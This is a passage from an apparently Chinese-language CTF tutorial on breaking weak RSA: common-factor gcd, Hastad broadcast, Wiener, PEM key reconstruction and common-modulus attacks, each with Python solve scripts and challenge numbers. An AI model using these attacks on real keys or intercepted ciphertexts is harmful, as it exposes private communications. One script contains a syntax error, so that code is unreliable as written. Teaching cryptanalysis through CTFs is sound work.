29703811006265969568420235185761287243393105045336995893094671661145408859269297497044834735198371987472186770953203812235003929122122129964989222762478116003185582578013431109127657242169359697936471497781547555222392181694624446976869099519331688628488881595076878345856808384797954271081176432330698334469596003760530797898645529616535584139559768170011693043197581376652770244664582733792825511473683193195672487559140733668442863818306947800631472845430628311685792799840854080385208783178691512540436222290062939858472754953657763052720510548438848633979413756332920634307585878271699119574149435107725143578613</span><br><span class="line">e is 65537</span><br><span class="line">c is 4578343924026570978472440931890325318245466288503599188533732998304051832656861172828218449138067382663459418589454854723253403947485557649615240187148291946554256687236506349553390057789720132702311963022032912389266835192465297150080916409872411988524410949952643478505491642457481045586019802683635095575472601541635397816830552539347027587330022646372943452066068029168471475125499435879399193076604330172042202401974524486727842888375820659903161039255979785711025431762267505041403586092799995451754527655054098031095440553010856162282818464431911828926227552966047893177859591679867661412947560702301353393344</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> a &lt; b:</span><br><span class="line">		a, b = b, a</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">		temp = a % b</span><br><span class="line">		a = b</span><br><span class="line">		b = temp</span><br><span class="line"> </span><br><span class="line"> 	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">28989197955870674811941817152881961892555962828020048566215146047714999804743571465320756664500939106612607504133407755470924915037883788416084924998195415611009578161228226056524027626453567996030151847302248848345942762209886902216532270655286303624781479379460319335849225128417295447574269158603952744753408534894136230960676590980945838733350143370605144754932401806068003166087495356366335014736018745371974324955357717635855207674309628146381030418983172039685916675081977078212813718313201568394044637347955108623458947913411108888733982376607647705302281273170230540579872437433435253235534772724624778056181</span></span><br><span class="line">n2 = <span class="number">29703811006265969568420235185761287243393105045336995893094671661145408859269297497044834735198371987472186770953203812235003929122122129964989222762478116003185582578013431109127657242169359697936471497781547555222392181694624446976869099519331688628488881595076878345856808384797954271081176432330698334469596003760530797898645529616535584139559768170011693043197581376652770244664582733792825511473683193195672487559140733668442863818306947800631472845430628311685792799840854080385208783178691512540436222290062939858472754953657763052720510548438848633979413756332920634307585878271699119574149435107725143578613</span></span><br><span class="line"></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p,<span class="string">"\n\n"</span>,n1 // p</span><br></pre></td></tr></table></figure>
<p>解出<span class="math inline">\(p\)</span>，<span class="math inline">\(q\)</span>，egcd取d，pow求m。</p>
<h2 id="低加密指数广播攻击">低加密指数广播攻击</h2>
<p>如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。</p>
<p>即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：</p>
<p><span class="math display">\[ c_1\equiv\ m^e\ mod\ n_1\]</span></p>
<p><span class="math display">\[ c_2\equiv\ m^e\ mod\ n_2\]</span></p>
<p><span class="math display">\[ c_3\equiv\ m^e\ mod\ n_3\]</span></p>
<p>对上述等式运用中国剩余定理，在<span class="math inline">\(e=3\)</span>时，可以得到：</p>
<p><span class="math display">\[ c_x \equiv m^3\ mod\ n_1n_2n_3\]</span></p>
<p>通过对<span class="math inline">\(c_x\)</span>进行三次开方可以求得明文。</p>
<h3 id="例题-3">例题</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n is 17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149</span><br><span class="line">e is 10</span><br><span class="line">c is 4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416</span><br><span class="line"></span><br><span class="line">n is 21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577</span><br><span class="line">e is 10</span><br><span class="line">c is 4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689</span><br><span class="line"></span><br><span class="line">n is 30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761</span><br><span class="line">e is 10</span><br><span class="line">c is 12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923</span><br><span class="line"></span><br><span class="line">n is 18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277</span><br><span class="line">e is 10</span><br><span class="line">c is 4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831</span><br><span class="line"></span><br><span class="line">n is 27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129</span><br><span class="line">e is 10</span><br><span class="line">c is 18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506</span><br><span class="line"></span><br><span class="line">n is 22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793</span><br><span class="line">e is 10</span><br><span class="line">c is 19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909</span><br><span class="line"></span><br><span class="line">n is 20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501</span><br><span class="line">e is 10</span><br><span class="line">c is 2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466</span><br><span class="line"></span><br><span class="line">n is 21745680718194037861694569863678082853797244380310200176477643943644972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273</span><br><span class="line">e is 10</span><br><span class="line">c is 9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926</span><br><span class="line"></span><br><span class="line">n is 23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821</span><br><span class="line">e is 10</span><br><span class="line">c is 17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553</span><br><span class="line"></span><br><span class="line">n is 27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257</span><br><span class="line">e is 10</span><br><span class="line">c is 8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316</span><br></pre></td></tr></table></figure>
<h3 id="解密脚本-1">解密脚本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_parse_number</span><span class="params">(number)</span>:</span></span><br><span class="line">    string = <span class="string">"%x"</span> % number</span><br><span class="line">    erg = []</span><br><span class="line">    <span class="keyword">while</span> string != <span class="string">''</span>:</span><br><span class="line">        erg = erg + [chr(int(string[:<span class="number">2</span>], <span class="number">16</span>))]</span><br><span class="line">        string = string[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(erg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    x,y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    lastx, lasty = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, (q, b) = b, divmod(a,b)</span><br><span class="line">        x, lastx = lastx-q*x, x</span><br><span class="line">        y, lasty = lasty-q*y, y</span><br><span class="line">    <span class="keyword">return</span> (lastx, lasty, a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder_theorem</span><span class="params">(items)</span>:</span></span><br><span class="line">  N = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    N *= n</span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    m = N/n</span><br><span class="line">    r, s, d = e_gcd(n, m)</span><br><span class="line">    <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> <span class="string">"Input not pairwise co-prime"</span></span><br><span class="line">    result += a*s*m</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result % N, N</span><br><span class="line"></span><br><span class="line">e=<span class="number">10</span></span><br><span class="line"></span><br><span class="line">n=[<span class="number">17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149</span>,<span class="number">21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577</span>,<span class="number">30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761</span>,<span class="number">18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277</span>,<span class="number">27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129</span>,<span class="number">22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793</span>,<span class="number">20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501</span>,<span class="number">21745680718194037861694569863678082853797244380310200176477643943644972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273</span>,<span class="number">23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821</span>,<span class="number">27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257</span>]</span><br><span class="line"></span><br><span class="line">c=[<span class="number">4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416</span>,<span class="number">4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689</span>,<span class="number">12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923</span>,<span class="number">4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831</span>,<span class="number">18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506</span>,<span class="number">19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909</span>,<span class="number">2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466</span>,<span class="number">9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926</span>,<span class="number">17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553</span>,<span class="number">8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316</span>]</span><br><span class="line"></span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c):</span><br><span class="line">	data += [(c[i],n[i])]</span><br><span class="line">x, n = chinese_remainder_theorem(data)</span><br><span class="line">realnum = gmpy.mpz(x).root(e)[<span class="number">0</span>].digits()</span><br><span class="line"><span class="keyword">print</span> my_parse_number(int(realnum))</span><br><span class="line"><span class="comment">#When e are small and same,it can be Hastad's broadcast attack.Maybe we won't have topic aboout RSA,but I wish you can explore it Non-stop.hctf&#123;Hastad's_broadcast_attack_is_interesting&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="低解密指数攻击">低解密指数攻击</h2>
<p>与低加密指数相同，低解密指数可以加快解密的过程，但是者也带来了安全问题。Wiener表示如果满足：</p>
<p><span class="math display">\[
d&lt;\frac{1}{3}n^\frac{1}{4}
\]</span> 那么一种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害RSA的安全。此时需要满足：</p>
<p><span class="math display">\[
q&lt;p&lt;2q
\]</span></p>
<p>如果满足上述条件，通过Wiener Attack可以在多项式时间中分解n。</p>
<p>rsa-wiener-attack的攻击源码开源在了github中，采取python编写，可以很容易使用。</p>
<p><strong>识别</strong></p>
<p>非常简单，e看起来很大就行了。</p>
<h3 id="例题-4">例题</h3>
<p>直接github用工具就行。https://github.com/pablocelayes/rsa-wiener-attack</p>
<p>这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import   sys</span><br><span class="line">sys.setrecursionlimit(10000000)</span><br></pre></td></tr></table></figure>
<h2 id="提供enc和pem文件">提供enc和pem文件</h2>
<h3 id="例题-5">例题</h3>
<p><a href="http://www.shiyanbar.com/ctf/1772" target="_blank" rel="noopener">RSA</a></p>
<p>使用openssl得到public.pem的n和e</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -text -modulus -pubin -in public.pem</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=A41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7</span><br></pre></td></tr></table></figure>
<p>利用gmpy2算出其他值，并使用pycryptodome模块导出private.pem</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = gmpy2.mpz(<span class="number">74207624142945242263057035287110983967646020057307828709587969646701361764263</span>)</span><br><span class="line">p = gmpy2.mpz(<span class="number">258631601377848992211685134376492365269</span>)</span><br><span class="line">q = gmpy2.mpz(<span class="number">286924040788547268861394901519826758027</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">65537</span>)</span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"private.pem"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    privateKey = RSA.construct((int(n), int(e), int(d), int(p), int(q)))</span><br><span class="line">    file.write(privateKey.exportKey())</span><br></pre></td></tr></table></figure>
<p>最后使用openssl解密flag.enc</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure>
<h2 id="共模攻击">共模攻击</h2>
<p>如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。</p>
<p>即：</p>
<p><span class="math display">\[
c_1 \equiv m^{e_1}\ mod\ n
\]</span></p>
<p><span class="math display">\[
c_2 \equiv m^{e_2}\ mod\ n
\]</span></p>
<p>此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。</p>
<p>过程如下，首先两个加密指数互质，则：</p>
<p><span class="math display">\[
(e_1,e_2)=1
\]</span></p>
<p>即存在<span class="math inline">\(s_1,s_2\)</span>使得：</p>
<p><span class="math display">\[
s_1e_1+s_2e_2=1
\]</span></p>
<p>又因为：</p>
<p><span class="math display">\[
c_1 \equiv m^{e_1}\ mod\ n
\]</span></p>
<p><span class="math display">\[
c_2 \equiv m^{e_2}\ mod\ n
\]</span></p>
<p>通过代入化简可以得出：</p>
<p><span class="math display">\[
c_1^{s_1}c_2^{s_2} \equiv m\ mod\ n
\]</span></p>
<p>明文解出。</p>
<h3 id="例题-6">例题</h3>
<p><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">Jarvis</a> very hard rsa</p>
<p>题目给了一个N，两个不同的e，猜到是共模攻击</p>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = int(open(<span 